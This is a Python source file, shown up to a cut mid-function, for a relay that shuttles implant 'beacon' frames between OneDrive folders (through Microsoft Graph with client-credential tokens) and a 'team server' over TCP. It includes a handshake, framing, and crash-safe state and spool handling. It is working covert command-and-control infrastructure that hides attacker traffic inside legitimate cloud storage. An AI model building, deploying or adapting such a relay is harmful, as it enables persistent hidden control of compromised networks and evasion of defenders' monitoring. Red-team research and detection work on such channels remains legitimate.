#!/usr/bin/env python3

import argparse
from contextlib import contextmanager
from datetime import datetime, timezone
import fcntl
import hashlib
import json
import logging
import os
import re
import secrets
import signal
import socket
import stat
import struct
import sys
import tempfile
import threading
import time

try:
    import requests
except ImportError:
    print("[-] pip install requests", file=sys.stderr)
    sys.exit(1)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("relay")

GRAPH_BASE = "https://graph.microsoft.com/v1.0"
TOKEN_URL = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
STATE_VERSION = 6
STATE_BINDING_FIELDS = (
    "tenant_id", "client_id", "drive_id", "inbox_folder_id", "outbox_folder_id",
)
MAX_PERSISTED_SEEN_IDS = 10000
MAX_FRAME_SIZE = 250 * 1024 * 1024
MAX_WORKERS = 8
MAX_SESSIONS = 128
CONNECT_TIMEOUT = 10.0
CLEANUP_INTERVAL = 300
MAX_PENDING_RESPONSES = 64
MAX_PENDING_BYTES = 512 * 1024 * 1024
DEFAULT_OUTBOX_TTL_SECONDS = 7 * 24 * 60 * 60

SESSION_RE = re.compile(r"^S([0-9a-f]{16})_[0-9]+$")
SPOOL_RE = re.compile(r"^[0-9a-f]{32}\.bin$")
SPOOL_TEMP_RE = re.compile(r"^[0-9a-f]{32}\.bin(?:\.[A-Za-z0-9_-]+)?\.tmp$")
HASH_RE = re.compile(r"^[0-9a-f]{64}$")


class RelayStatePersistenceError(RuntimeError):
    pass


class RelayStateConfigurationError(RelayStatePersistenceError):
    pass


def state_binding(config):
    if not isinstance(config, dict):
        raise RelayStateConfigurationError("configuration must be an object")
    for key in STATE_BINDING_FIELDS:
        value = config.get(key)
        if not isinstance(value, str) or not value or "\0" in value:
            raise RelayStateConfigurationError("missing or invalid configuration field: %s" % key)
    return {key: config[key] for key in STATE_BINDING_FIELDS}


# persists relay state + spools responses to survive crashes mid-upload
class RelayStateStore:

    def __init__(self, path, config):
        self.path = os.path.abspath(path) if path else None
        self.binding = state_binding(config)
        self.lock = threading.RLock()
        self.initialized = False
        self.seen_ids = set()
        self.cleanup_ids = set()
        self.pending_responses = {}
        self.pending_reservations = {}
        self.pending_owners = set()
        self.delivery_intents = {}
        self.failure = None
        self.spool_dir = self.path + ".spool" if self.path else None
        self._spool_identity = None
        if self.path and os.path.exists(self.path):
            self._load()
        else:
            self._prepare_spool(require_empty=True)

    def _prepare_spool(self, *, require_empty=False):
        if self.spool_dir:
            with self._spool_directory(create=True, secure=True,
                                       require_empty=require_empty):
                pass

    @contextmanager
    def _spool_directory(self, *, create=False, secure=False, require_empty=False):
        if not self.spool_dir:
            raise RelayStatePersistenceError("spool directory is unavailable")
        flags = os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW
        directory_fd = None
        try:
            try:
                directory_fd = os.open(os.path.sep, flags)
                parts = [part for part in self.spool_dir.split(os.path.sep) if part]
                for part in parts:
                    try:
                        next_fd = os.open(part, flags, dir_fd=directory_fd)
                    except FileNotFoundError:
                        if not create:
                            raise
                        try:
                            os.mkdir(part, 0o700, dir_fd=directory_fd)
                        except FileExistsError:
                            pass
                        next_fd = os.open(part, flags, dir_fd=directory_fd)
                    os.close(directory_fd)
                    directory_fd = next_fd
                info = os.fstat(directory_fd)
                identity = (info.st_dev, info.st_ino)
                if self._spool_identity is not None and identity != self._spool_identity:
                    raise ValueError("spool directory was replaced")
                if require_empty and os.listdir(directory_fd):
                    raise RelayStateConfigurationError(
                        "response spools exist without state; restore their original state file")
                if secure:
                    try:
                        os.fchmod(directory_fd, 0o700)
                    except OSError:
                        pass
                self._spool_identity = identity
            except (OSError, ValueError) as e:
                raise RelayStatePersistenceError(
                    "unsafe relay spool %s: %s; use a private local state directory" % (
                        self.spool_dir, e)) from e
            yield directory_fd
        finally:
            if directory_fd is not None:
                os.close(directory_fd)

    @staticmethod
    def _spool_filename(name):
        if (not isinstance(name, str) or not name or name in (".", "..")
                or os.path.basename(name) != name or "\0" in name):
            raise ValueError("invalid spool filename")
        return name

    @contextmanager
    def _open_spool_file(self, name, mode="rb"):
        name = self._spool_filename(name)
        with self._spool_directory() as directory_fd:
            fd = os.open(name, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK,
                         dir_fd=directory_fd)
            try:
                info = os.fstat(fd)
                if not stat.S_ISREG(info.st_mode):
                    raise ValueError("spool entry must be a regular file")
                stream = os.fdopen(fd, mode, **({} if "b" in mode else {"encoding": "utf-8"}))
            except BaseException:
                os.close(fd)
                raise
            with stream:
                yield stream

    def _replace_spool_file(self, name, data, *, sync_directory=True):
        name = self._spool_filename(name)
        with self._spool_directory() as directory_fd:
            for _ in range(128):
                temporary = name + "." + secrets.token_hex(8) + ".tmp"
                try:
                    fd = os.open(temporary, os.O_WRONLY | os.O_CREAT | os.O_EXCL
                                 | os.O_NOFOLLOW, 0o600, dir_fd=directory_fd)
                    break
                except FileExistsError:
                    continue
            else:
                raise FileExistsError("cannot create an exclusive spool temporary file")
            try:
                try:
                    stream = os.fdopen(fd, "wb")
                except BaseException:
                    os.close(fd)
                    raise
                with stream:
                    stream.write(data)
                    stream.flush()
                    os.fsync(stream.fileno())
                os.replace(temporary, name, src_dir_fd=directory_fd, dst_dir_fd=directory_fd)
            except Exception:
                try:
                    os.unlink(temporary, dir_fd=directory_fd)
                except OSError:
                    pass
                raise
            if sync_directory:
                try:
                    os.fsync(directory_fd)
                except OSError as e:
                    log.warning("Directory fsync failed for spool update "
                                "(non-fatal, may lose durability on power loss): %s", e)

    def _unlink_spool_file(self, name):
        name = self._spool_filename(name)
        with self._spool_directory() as directory_fd:
            os.unlink(name, dir_fd=directory_fd)

    def assert_config(self, config):
        current = state_binding(config)
        differing = [key for key in STATE_BINDING_FIELDS if current[key] != self.binding[key]]
        if differing:
            raise RelayStateConfigurationError(
                "relay state configuration mismatch (%s); use the original configuration "
                "or a separate state path" % ", ".join(differing))

    def _load(self):
        try:
            with open(self.path, encoding="utf-8") as f:
                data = json.load(f)
        except Exception as e:
            raise RuntimeError("cannot load relay state %s: %s" % (self.path, e)) from e

        if not isinstance(data, dict):
            raise RuntimeError("invalid relay state document %s" % self.path)
        ver = data.get("version")
        if isinstance(ver, bool) or ver != STATE_VERSION:
            raise RuntimeError("unsupported relay state version in %s (expected %d)" % (
                self.path, STATE_VERSION))

        binding = data.get("binding")
        if not isinstance(binding, dict) or set(binding) != set(STATE_BINDING_FIELDS):
            raise RelayStateConfigurationError("missing or invalid state configuration binding")
        self.assert_config(binding)
        self._prepare_spool()

        if not isinstance(data.get("initialized"), bool):
            raise RuntimeError("initialized must be bool in %s" % self.path)
        if not isinstance(data.get("seen_ids"), list):
            raise RuntimeError("missing or invalid seen_ids in %s" % self.path)
        if not isinstance(data.get("cleanup_ids"), list):
            raise RuntimeError("missing or invalid cleanup_ids in %s" % self.path)
        self.initialized = data["initialized"]

        raw_seen = data.get("seen_ids", [])
        raw_cleanup = data.get("cleanup_ids", [])
        for x in raw_seen:
            if not isinstance(x, str) or not x:
                raise RuntimeError("invalid seen_id element in %s" % self.path)
        for x in raw_cleanup:
            if not isinstance(x, str) or not x:
                raise RuntimeError("invalid cleanup_id element in %s" % self.path)
        self.seen_ids = set(raw_seen)
        self.cleanup_ids = set(raw_cleanup)
        self.seen_ids.update(self.cleanup_ids)

        intents = data.get("delivery_intents")
        if not isinstance(intents, dict):
            raise RuntimeError("missing or invalid delivery_intents in %s" % self.path)
        for item_id, name in intents.items():
            if (not isinstance(item_id, str) or not item_id
                    or not isinstance(name, str)
                    or SESSION_RE.fullmatch(name) is None):
                raise RuntimeError("invalid delivery intent %r in %s" % (item_id, self.path))
        self.delivery_intents = dict(intents)
        self.seen_ids.update(intents)

        pending = data.get("pending_responses")
        if not isinstance(pending, dict):
            raise RuntimeError("missing or invalid pending_responses in %s" % self.path)

        for item_id, entry in pending.items():
            valid = (
                isinstance(item_id, str) and bool(item_id)
                and isinstance(entry, dict)
                and isinstance(entry.get("name"), str)
                and SESSION_RE.fullmatch(entry["name"]) is not None
                and isinstance(entry.get("spool"), str)
                and SPOOL_RE.fullmatch(entry["spool"]) is not None
                and isinstance(entry.get("size"), int)
                and not isinstance(entry["size"], bool)
                and 4 <= entry["size"] <= MAX_FRAME_SIZE
                and isinstance(entry.get("hash"), str)
                and HASH_RE.fullmatch(entry["hash"]) is not None
            )
            if not valid:
                raise RuntimeError(
                    "invalid pending response %r in %s" % (item_id, self.path))
            self.pending_responses[str(item_id)] = dict(entry)
            self.seen_ids.add(str(item_id))
            self.cleanup_ids.add(str(item_id))

        if self.delivery_intents.keys() & self.pending_responses.keys():
            raise RuntimeError("delivery intents overlap pending responses in %s" % self.path)

        try:
            os.chmod(self.path, 0o600)
        except OSError:
            pass

        seen_count = len(self.seen_ids)
        self._trim_seen_locked()
        if len(self.seen_ids) != seen_count:
            self._write_file_locked()

    def _trim_seen_locked(self):
        excess = len(self.seen_ids) - MAX_PERSISTED_SEEN_IDS
        if excess <= 0:
            return
        protected = (self.cleanup_ids | set(self.pending_responses)
                     | set(self.delivery_intents))
        removable = self.seen_ids - protected
        for mid in list(removable)[:excess]:
            self.seen_ids.discard(mid)

    def _write_file_locked(self):
        self._trim_seen_locked()
        if not self.path:
            return
        directory = os.path.dirname(self.path) or "."
        os.makedirs(directory, exist_ok=True)
        data = {
            "version": STATE_VERSION,
            "binding": self.binding,
            "initialized": self.initialized,
            "seen_ids": sorted(self.seen_ids),
            "cleanup_ids": sorted(self.cleanup_ids),
            "pending_responses": self.pending_responses,
            "delivery_intents": self.delivery_intents,
        }

        fd, tmp_path = tempfile.mkstemp(
            prefix=os.path.basename(self.path) + ".", suffix=".tmp", dir=directory)
        try:
            with os.fdopen(fd, "w", encoding="utf-8") as f:
                json.dump(data, f, separators=(",", ":"), sort_keys=True)
                f.flush()
                os.fsync(f.fileno())
            os.replace(tmp_path, self.path)
            try:
                dir_fd = os.open(directory, os.O_RDONLY)
                try:
                    os.fsync(dir_fd)
                finally:
                    os.close(dir_fd)
            except OSError as e:
                log.warning("Directory fsync failed for state update "
                            "(non-fatal, may lose durability on power loss): %s", e)
        except Exception:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
            raise

    def _write_locked(self):
        if self.failure:
            raise RelayStatePersistenceError(self.failure)
        try:
            self._write_file_locked()
        except Exception as e:
            self.failure = "cannot persist relay state %s: %s" % (self.path, e)
            raise RelayStatePersistenceError(self.failure) from e

    def initialize(self, seen_ids):
        with self.lock:
            self.initialized = True
            self.seen_ids.update(x for x in seen_ids if x)
            self._write_locked()

    def remember_seen(self, ids, cleanup=False):
        with self.lock:
            ids = {x for x in ids if x}
            self.seen_ids.update(ids)
            if cleanup:
                self.cleanup_ids.update(ids)
            self._write_locked()

    def acknowledge_deleted(self, ids):
        with self.lock:
            self.cleanup_ids.difference_update(x for x in ids if x)
            self._write_locked()

    def try_reserve_pending(self, item_id, reserve_size=MAX_FRAME_SIZE):
        if (not isinstance(item_id, str) or not item_id
                or not isinstance(reserve_size, int)
                or isinstance(reserve_size, bool)
                or reserve_size < 4 or reserve_size > MAX_FRAME_SIZE):
            raise ValueError("invalid pending reservation")
        with self.lock:
            if (item_id in self.pending_responses or item_id in self.pending_reservations
                    or item_id in self.pending_owners):
                return False
            if (len(self.pending_responses) + len(self.pending_reservations)
                    >= MAX_PENDING_RESPONSES):
                return False
            used = sum(e["size"] for e in self.pending_responses.values())
            reserved = sum(self.pending_reservations.values())
            if used + reserved + reserve_size > MAX_PENDING_BYTES:
                return False
            self.pending_reservations[item_id] = reserve_size
            self.pending_owners.add(item_id)
            return True

    def release_pending_reservation(self, item_id):
        with self.lock:
            self.pending_reservations.pop(item_id, None)
            self.pending_owners.discard(item_id)

    def try_claim_pending(self, item_id):
        with self.lock:
            if self.failure:
                raise RelayStatePersistenceError(self.failure)
            if item_id in self.pending_owners:
                return None
            entry = self.pending_responses.get(item_id)
            if entry is None:
                return None
            self.pending_owners.add(item_id)
            return dict(entry)

    def release_pending_claim(self, item_id):
        with self.lock:
            self.pending_owners.discard(item_id)

    def begin_delivery(self, item_id, item_name):
        if (not isinstance(item_id, str) or not item_id
                or not isinstance(item_name, str)
                or SESSION_RE.fullmatch(item_name) is None):
            raise ValueError("invalid delivery intent")
        with self.lock:
            if not self.path:
                raise RelayStatePersistenceError("delivery requires durable relay state")
            if self.failure:
                raise RelayStatePersistenceError(self.failure)
            if item_id in self.seen_ids:
                return False
            self.delivery_intents[item_id] = item_name
            self.seen_ids.add(item_id)
            self._write_locked()
            return True

    def recover_interrupted_deliveries(self):
        with self.lock:
            intents = dict(self.delivery_intents)
        for item_id, item_name in intents.items():
            try:
                abort_frame = struct.pack("<I", 0)
                spool_name, data_hash = self.write_spool(item_id, item_name, abort_frame)
                self.record_pending(item_id, item_name, spool_name, len(abort_frame), data_hash)
            except Exception as e:
                self.mark_failed("cannot recover interrupted delivery %s: %s" % (item_id, e))
                raise RelayStatePersistenceError(self.failure) from e
            log.warning("Quarantined interrupted delivery %s with an abort response; "
                        "the request will not be forwarded again", item_name)

    def _write_manifest_file(self, item_id, item_name, spool_name,
                             size, data_hash, stage):
        manifest = {
            "item_id": item_id,
            "item_name": item_name,
            "size": size,
            "sha256": data_hash,
            "stage": stage,
        }
        self._replace_spool_file(spool_name.replace(".bin", ".manifest.json"),
                                 json.dumps(manifest, separators=(",", ":")).encode("utf-8"))

    def write_spool(self, item_id, item_name, data):
        data_hash = hashlib.sha256(data).hexdigest()
        spool_name = hashlib.sha256(item_id.encode()).hexdigest()[:32] + ".bin"
        self._replace_spool_file(spool_name, data, sync_directory=False)

        self._write_manifest_file(
            item_id, item_name, spool_name, len(data), data_hash, "spooled")

        return spool_name, data_hash

    def record_pending(self, item_id, item_name, spool_name, size, data_hash):
        with self.lock:
            self.pending_reservations.pop(item_id, None)
            self.delivery_intents.pop(item_id, None)
            self.pending_responses[item_id] = {
                "name": item_name,
                "spool": spool_name,
                "size": size,
                "hash": data_hash,
            }
            self.seen_ids.add(item_id)
            self.cleanup_ids.add(item_id)
            self._write_locked()

    def _update_manifest_stage(self, spool_name, stage):
        manifest_name = spool_name.replace(".bin", ".manifest.json")
        with self._open_spool_file(manifest_name, "r") as f:
            manifest = json.load(f)
        manifest["stage"] = stage
        self._replace_spool_file(manifest_name,
                                 json.dumps(manifest, separators=(",", ":")).encode("utf-8"))

    def complete_pending(self, item_id, deleted=True):
        with self.lock:
            entry = self.pending_responses.get(item_id)
            if entry and self.spool_dir:
                try:
                    self._update_manifest_stage(entry["spool"], "completed")
                except Exception as e:
                    self.failure = (
                        "manifest stage update failed for %s: %s" % (item_id, e))
                    raise RelayStatePersistenceError(self.failure) from e
            entry = self.pending_responses.pop(item_id, None)
            if deleted:
                self.cleanup_ids.discard(item_id)
            self._write_locked()
        if entry and self.spool_dir:
            try:
                self._unlink_spool_file(entry["spool"])
            except OSError:
                pass
            try:
                self._unlink_spool_file(entry["spool"].replace(".bin", ".manifest.json"))
            except OSError:
                pass

    def read_spool(self, spool_name, max_size=MAX_FRAME_SIZE):
        with self._open_spool_file(spool_name) as f:
            data = f.read(max_size + 1)
        if len(data) > max_size:
            raise ValueError("spool %s exceeds %d bytes" % (spool_name, max_size))
        return data

    def read_manifest_stage(self, item_id, entry):
        spool_name = entry.get("spool")
        try:
            if not self.spool_dir:
                raise ValueError("spool directory is unavailable")
            if not isinstance(spool_name, str) or not SPOOL_RE.fullmatch(spool_name):
                raise ValueError("invalid spool filename")
            expected_spool = hashlib.sha256(
                item_id.encode()).hexdigest()[:32] + ".bin"
            if spool_name != expected_spool:
                raise ValueError("spool filename does not match item_id")

            manifest_name = spool_name.replace(".bin", ".manifest.json")
            with self._open_spool_file(manifest_name, "r") as f:
                manifest = json.load(f)
            if not isinstance(manifest, dict):
                raise ValueError("manifest is not an object")
            stage = manifest.get("stage")
            if stage not in ("spooled", "completed"):
                raise ValueError("invalid manifest stage: %r" % stage)
            if manifest.get("item_id") != item_id:
                raise ValueError("manifest item_id mismatch")
            if manifest.get("item_name") != entry.get("name"):
                raise ValueError("manifest item_name mismatch")
            if (not isinstance(manifest.get("size"), int)
                    or isinstance(manifest.get("size"), bool)
                    or manifest["size"] != entry.get("size")):
                raise ValueError("manifest size mismatch")
            if (not isinstance(manifest.get("sha256"), str)
                    or not HASH_RE.fullmatch(manifest["sha256"])
                    or manifest["sha256"] != entry.get("hash")):
                raise ValueError("manifest hash mismatch")
            return stage
        except Exception as e:
            message = "invalid manifest for pending %s: %s" % (item_id, e)
            with self.lock:
                self.failure = message
            raise RelayStatePersistenceError(message) from e

    def pending_snapshot(self):
        with self.lock:
            return dict(self.pending_responses)

    def seen_snapshot(self):
        with self.lock:
            return set(self.seen_ids)

    def cleanup_snapshot(self):
        with self.lock:
            return set(self.cleanup_ids)

    def assert_healthy(self):
        with self.lock:
            if self.failure:
                raise RelayStatePersistenceError(self.failure)

    def mark_failed(self, message):
        with self.lock:
            if not self.failure:
                self.failure = message

    def clean_orphan_spools(self):
        if not self.spool_dir:
            return
        with self.lock:
            valid = {e["spool"] for e in self.pending_responses.values()}

        orphan_bins = []
        with self._spool_directory() as directory_fd:
            all_files = os.listdir(directory_fd)
        bin_set = {f for f in all_files if f.endswith(".bin")}
        for f in all_files:
            if f.endswith(".bin") and f not in valid:
                orphan_bins.append(f)

        unrecoverable_artifacts = []
        for f in all_files:
            if SPOOL_TEMP_RE.fullmatch(f):
                log.critical("Incomplete response spool retained: %s", f)
                unrecoverable_artifacts.append(f)

        for f in all_files:
            if not f.endswith(".manifest.json"):
                continue
            bin_name = f.replace(".manifest.json", ".bin")
            if bin_name in bin_set:
                continue
            try:
                with self._open_spool_file(f, "r") as fh:
                    manifest = json.load(fh)
                if not isinstance(manifest, dict):
                    raise ValueError("manifest is not an object")
                stage = manifest.get("stage")
                item_id = manifest.get("item_id")
                item_name = manifest.get("item_name")
                expected_size = manifest.get("size")
                expected_hash = manifest.get("sha256")
                expected_bin = (hashlib.sha256(item_id.encode()).hexdigest()[:32]
                                + ".bin") if isinstance(item_id, str) else None
                if not (stage in ("spooled", "completed")
                        and isinstance(item_id, str) and item_id
                        and isinstance(item_name, str)
                        and SESSION_RE.fullmatch(item_name)
                        and isinstance(expected_size, int)
                        and not isinstance(expected_size, bool)
                        and 4 <= expected_size <= MAX_FRAME_SIZE
                        and isinstance(expected_hash, str)
                        and HASH_RE.fullmatch(expected_hash)
                        and bin_name == expected_bin):
                    raise ValueError("invalid manifest fields or filename binding")
                if stage != "completed":
                    raise ValueError("stage=spooled but response binary is missing")
                if bin_name in valid:
                    continue
                self._unlink_spool_file(f)
                log.info("Cleaned stale manifest-only orphan %s", f)
            except Exception as e:
                log.critical("Manifest-only orphan retained: %s  - %s", f, e)
                unrecoverable_artifacts.append(f)

        if not orphan_bins:
            if unrecoverable_artifacts:
                raise RelayStatePersistenceError(
                    "%d response spool artifact(s) require manual recovery: %s" % (
                        len(unrecoverable_artifacts),
                        ", ".join(unrecoverable_artifacts)))
            return

        recovered = 0
        unrecoverable = []
        for spool_name in orphan_bins:
            manifest_name = spool_name.replace(".bin", ".manifest.json")
            try:
                with self._open_spool_file(manifest_name, "r") as mf:
                    manifest = json.load(mf)
                stage = manifest.get("stage")
                if stage not in ("spooled", "completed"):
                    raise ValueError("invalid or missing manifest stage: %r" % stage)
                item_id = manifest["item_id"]
                item_name = manifest["item_name"]
                expected_size = manifest["size"]
                expected_hash = manifest["sha256"]
                if not (isinstance(item_id, str) and item_id
                        and isinstance(item_name, str)
                        and SESSION_RE.fullmatch(item_name)
                        and isinstance(expected_size, int)
                        and 4 <= expected_size <= MAX_FRAME_SIZE
                        and isinstance(expected_hash, str)
                        and HASH_RE.fullmatch(expected_hash)):
                    raise ValueError("invalid manifest fields")
                expected_spool = hashlib.sha256(
                    item_id.encode()).hexdigest()[:32] + ".bin"
                if spool_name != expected_spool:
                    raise ValueError(
                        "manifest item_id %s does not match spool %s (expected %s)" % (
                            item_id, spool_name, expected_spool))
                if stage == "completed":
                    try:
                        self._unlink_spool_file(spool_name)
                    except OSError:
                        pass
                    try:
                        self._unlink_spool_file(manifest_name)
                    except OSError:
                        pass
                    log.info("Cleaned completed orphan spool %s", spool_name)
                    continue
                with self._open_spool_file(spool_name) as sf:
                    spool_data = sf.read(expected_size + 1)
                if len(spool_data) != expected_size:
                    raise ValueError("size mismatch: %d vs %d" % (
                        len(spool_data), expected_size))
                if hashlib.sha256(spool_data).hexdigest() != expected_hash:
                    raise ValueError("hash mismatch")
                declared = struct.unpack("<I", spool_data[:4])[0]
                if declared != len(spool_data) - 4:
                    raise ValueError("invalid frame header")
                with self.lock:
                    if item_id in self.pending_responses:
                        raise ValueError(
                            "duplicate item_id %s already pending" % item_id)
                    self.pending_responses[item_id] = {
                        "name": item_name,
                        "spool": spool_name,
                        "size": expected_size,
                        "hash": expected_hash,
                    }
                    self.delivery_intents.pop(item_id, None)
                    self.seen_ids.add(item_id)
                    self.cleanup_ids.add(item_id)
                recovered += 1
                log.warning("Recovered orphan spool %s for item %s", spool_name, item_id)
            except Exception as e:
                log.critical("Unreferenced spool retained (no valid manifest): %s  - %s",
                             spool_name, e)
                unrecoverable.append(spool_name)

        if recovered:
            try:
                self._write_file_locked()
            except Exception as e:
                raise RelayStatePersistenceError(
                    "failed to persist recovered spools: %s" % e)
            log.info("Recovered %d orphan spools from manifests", recovered)

        all_unrecoverable = unrecoverable_artifacts + unrecoverable
        if all_unrecoverable:
            raise RelayStatePersistenceError(
                "%d response spool artifact(s) require manual recovery: %s" % (
                    len(all_unrecoverable), ", ".join(all_unrecoverable)))


class GraphClient:
    def __init__(self, tenant_id, client_id, client_secret):
        self.tenant_id = tenant_id
        self.client_id = client_id
        self.client_secret = client_secret
        self.token = None
        self.token_expiry = 0
        self._token_lock = threading.Lock()

    def _ensure_token(self):
        with self._token_lock:
            if self.token and time.time() < self.token_expiry - 60:
                return
            url = TOKEN_URL.format(tenant_id=self.tenant_id)
            data = {
                "grant_type": "client_credentials",
                "client_id": self.client_id,
                "client_secret": self.client_secret,
                "scope": "https://graph.microsoft.com/.default",
            }
            r = requests.post(url, data=data, timeout=15)
            r.raise_for_status()
            body = r.json()
            self.token = body["access_token"]
            self.token_expiry = time.time() + body.get("expires_in", 3600)
            log.info("Token acquired (expires in %ds)", body.get("expires_in", 3600))

    def _invalidate_token(self):
        with self._token_lock:
            self.token = None
            self.token_expiry = 0

    def _headers(self, content_type="application/json"):
        self._ensure_token()
        return {
            "Authorization": "Bearer %s" % self.token,
            "Content-Type": content_type,
        }

    def upload_file(self, drive_id, folder_id, filename, data, max_retries=3):
        url = "%s/drives/%s/items/%s:/%s:/content" % (
            GRAPH_BASE, drive_id, folder_id, filename)
        for attempt in range(max_retries):
            try:
                r = requests.put(
                    url, headers=self._headers("application/octet-stream"),
                    data=data, timeout=30)
                if r.status_code == 401 and attempt < max_retries - 1:
                    self._invalidate_token()
                    continue
                if r.status_code == 429:
                    retry_after = int(r.headers.get("Retry-After", 2))
                    log.warning("Graph 429, waiting %ds", retry_after)
                    time.sleep(retry_after)
                    continue
                r.raise_for_status()
                return
            except requests.exceptions.HTTPError:
                if attempt < max_retries - 1:
                    time.sleep(1)
                    continue
                raise
        raise RuntimeError("upload exhausted after %d retries" % max_retries)

    def list_files(self, drive_id, folder_id, top=50):
        results = []
        url = "%s/drives/%s/items/%s/children?$top=%d" % (
            GRAPH_BASE, drive_id, folder_id, top)
        while url:
            r = requests.get(url, headers=self._headers(), timeout=15)
            if r.status_code == 401:
                self._invalidate_token()
                r = requests.get(url, headers=self._headers(), timeout=15)
            if r.status_code >= 400:
                log.error("list_files %d: %s", r.status_code, r.text[:500])
            r.raise_for_status()
            body = r.json()
            results.extend(body.get("value", []))
            url = body.get("@odata.nextLink")
        return results

    def download_file(self, drive_id, item_id, max_size=MAX_FRAME_SIZE):
        url = "%s/drives/%s/items/%s/content" % (GRAPH_BASE, drive_id, item_id)
        r = requests.get(url, headers=self._headers(), timeout=30,
                         allow_redirects=True, stream=True)
        if r.status_code == 401:
            self._invalidate_token()
            r = requests.get(url, headers=self._headers(), timeout=30,
                             allow_redirects=True, stream=True)
        r.raise_for_status()
        chunks = []
        total = 0
        for chunk in r.iter_content(65536):
            total += len(chunk)
            if total > max_size:
                r.close()
                raise ValueError("download exceeds %d bytes" % max_size)
            chunks.append(chunk)
        return b"".join(chunks)

    def delete_file(self, drive_id, item_id):
        url = "%s/drives/%s/items/%s" % (GRAPH_BASE, drive_id, item_id)
        try:
            r = requests.delete(url, headers=self._headers(), timeout=15)
            if r.status_code == 401:
                self._invalidate_token()
                r = requests.delete(url, headers=self._headers(), timeout=15)
            return r.status_code in (200, 204, 404)
        except Exception:
            return False


class TeamServerConnection:

    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.sock = None
        self.ready = False

    def connect(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(CONNECT_TIMEOUT)
        self.sock.connect((self.addr, self.port))
        self.sock.settimeout(30.0)
        self.ready = False
        log.info("Connected to team server %s:%d", self.addr, self.port)

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
        self.ready = False

    def send_go(self):
        self._send_frame(b"go")
        self.ready = True
        log.info("Sent 'go' handshake")

    def _send_frame(self, data):
        frame = struct.pack("<I", len(data)) + data
        self.sock.sendall(frame)

    def send_raw(self, data):
        self.sock.sendall(data)

    def recv_full_frame(self, timeout=30.0):
        old_timeout = self.sock.gettimeout()
        self.sock.settimeout(timeout)
        try:
            header = self._recv_exact(4)
            if not header:
                return None
            length = struct.unpack("<I", header)[0]
            if length == 0:
                return header
            if length > MAX_FRAME_SIZE - 4:
                log.warning("Frame too large: %d bytes", length)
                self.close()
                return None
            data = self._recv_exact(length)
            if data:
                return header + data
            log.warning("Partial payload  - closing socket")
            self.close()
            return None
        finally:
            if self.sock:
                try:
                    self.sock.settimeout(old_timeout)
                except Exception:
                    pass

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            try:
                chunk = self.sock.recv(n - len(buf))
            except socket.timeout:
                if buf:
                    log.debug("  RX partial: got %d of %d bytes", len(buf), n)
                return None
            if not chunk:
                return None
            buf += chunk
        return buf


def _parse_graph_timestamp(value):
    if not isinstance(value, str) or not value:
        raise ValueError("missing Graph timestamp")
    normalized = value[:-1] + "+00:00" if value.endswith("Z") else value
    parsed = datetime.fromisoformat(normalized)
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=timezone.utc)
    return parsed.timestamp()


def _cleanup_stale_outbox(graph, config, state_store, now=None):
    state_store.assert_config(config)
    ttl = config.get("outbox_ttl_seconds", DEFAULT_OUTBOX_TTL_SECONDS)
    if ttl == 0:
        return 0
    now = time.time() if now is None else now
    protected_names = {
        entry["name"] for entry in state_store.pending_snapshot().values()
    }
    items = graph.list_files(
        config["drive_id"], config["outbox_folder_id"], top=50)
    deleted = 0
    for item in items:
        item_id = item.get("id")
        name = item.get("name")
        if (not item_id or not isinstance(name, str)
                or not SESSION_RE.fullmatch(name)
                or name in protected_names
                or "file" not in item):
            continue
        timestamp = item.get("lastModifiedDateTime") or item.get("createdDateTime")
        try:
            modified = _parse_graph_timestamp(timestamp)
        except (TypeError, ValueError):
            log.warning("Cannot age outbox item %s: invalid timestamp %r",
                        name, timestamp)
            continue
        if now - modified < ttl:
            continue
        if graph.delete_file(config["drive_id"], item_id):
            deleted += 1
        else:
            log.warning("Failed to delete stale outbox item %s", name)
    return deleted


SESSION_TIMEOUT = 3600


# one TCP connection per beacon session, UDC2 has no session recovery
class SessionState:
    def __init__(self, session_id, ts_addr, ts_port):
        self.session_id = session_id
        self.ts = TeamServerConnection(ts_addr, ts_port)
        self.last_active = time.time()
        self.lock = threading.Lock()

    def ensure_connected(self):
        if not self.ts.sock:
            self.ts.connect()
            self.ts.send_go()
            log.info("Session %s: new TCP + go", self.session_id)
        elif not self.ts.ready:
            self.ts.send_go()

    def close(self):
        self.ts.close()


def _valid_frame(file_data, session_id):
    if len(file_data) < 4:
        log.warning("[%s] Frame too small: %d bytes", session_id, len(file_data))
        return False
    if len(file_data) > MAX_FRAME_SIZE:
        log.warning("[%s] Frame too large: %d bytes", session_id, len(file_data))
        return False
    frame_len = struct.unpack("<I", file_data[:4])[0]
    if frame_len != len(file_data) - 4:
        log.warning("[%s] Frame length mismatch: header=%d actual=%d",
                    session_id, frame_len, len(file_data) - 4)
        return False
    return True


def process_file(graph, config, sess, item_id, item_name, file_data,
                 seen_ids, inflight, lock, state_store):
    state_store.assert_config(config)
    drive_id = config["drive_id"]
    outbox = config["outbox_folder_id"]

    if not _valid_frame(file_data, sess.session_id):
        _finish_item(graph, drive_id, item_id, seen_ids, inflight, lock, state_store)
        return

    if not state_store.try_reserve_pending(item_id, MAX_FRAME_SIZE):
        log.warning("[%s] Spool capacity full, deferring %s",
                    sess.session_id, item_name)
        with lock:
            inflight.discard(item_id)
        return

    try:
        with sess.lock:
            try:
                sess.ensure_connected()
            except Exception as e:
                log.error("[%s] Cannot connect to team server: %s", sess.session_id, e)
                sess.close()
                return

            log.info("[%s] Beacon frame: %d bytes", sess.session_id, len(file_data))

            try:
                should_send = state_store.begin_delivery(item_id, item_name)
            except Exception as e:
                state_store.mark_failed("cannot record delivery intent for %s: %s" % (item_id, e))
                log.critical("[%s] Delivery intent failed, halting relay: %s", sess.session_id, e)
                return
            with lock:
                seen_ids.add(item_id)
            if not should_send:
                return

            try:
                sess.ts.send_raw(file_data)
            except Exception as e:
